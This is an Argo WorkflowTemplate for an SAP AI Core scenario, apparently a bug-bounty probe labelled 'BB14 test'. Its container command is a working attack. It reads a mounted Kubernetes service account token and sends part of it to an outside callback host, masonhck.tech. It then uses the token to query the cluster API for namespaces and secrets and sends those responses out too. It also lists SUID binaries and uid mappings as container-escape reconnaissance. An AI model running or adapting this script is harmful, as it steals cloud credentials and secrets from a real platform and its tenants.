apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "41.0.0"
spec:
  entrypoint: main
  volumes:
  - name: proj-token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
          audience: api
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      volumeMounts:
      - name: proj-token
        mountPath: /var/run/proj
      command:
      - bash
      - -c
      - |
        CB="https://www.masonhck.tech/ssrf.php"
        # Send ALL results via callback URL params (no log dependency)
        PROJ=$(ls /var/run/proj/ 2>/dev/null | tr '\n' ',')
        T=$(cat /var/run/proj/token 2>/dev/null)
        TLEN=${#T}
        curl -s "${CB}?src=v41-proj&len=${TLEN}&files=${PROJ}" >/dev/null
        if [ -n "$T" ]; then
          # GOT TOKEN! Send first 100 chars via callback
          T100=$(echo "$T" | head -c 100 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
          curl -s "${CB}?src=v41-token&t=${T100}" >/dev/null
          # Test K8s API
          NS_RESP=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 200 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
          curl -s "${CB}?src=v41-k8s-ns&r=${NS_RESP}" >/dev/null
          SEC_RESP=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 200 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
          curl -s "${CB}?src=v41-k8s-sec&r=${SEC_RESP}" >/dev/null
        fi
        # Escape checks via callback
        SUID=$(find / -perm -4000 2>/dev/null | head -3 | tr '\n' ',')
        UIDMAP=$(cat /proc/self/uid_map 2>/dev/null | tr '\t' '_' | tr '\n' ',')
        curl -s "${CB}?src=v41-esc&suid=${SUID}&uid=${UIDMAP}" >/dev/null
        echo "V41 TLEN=${TLEN} DONE"
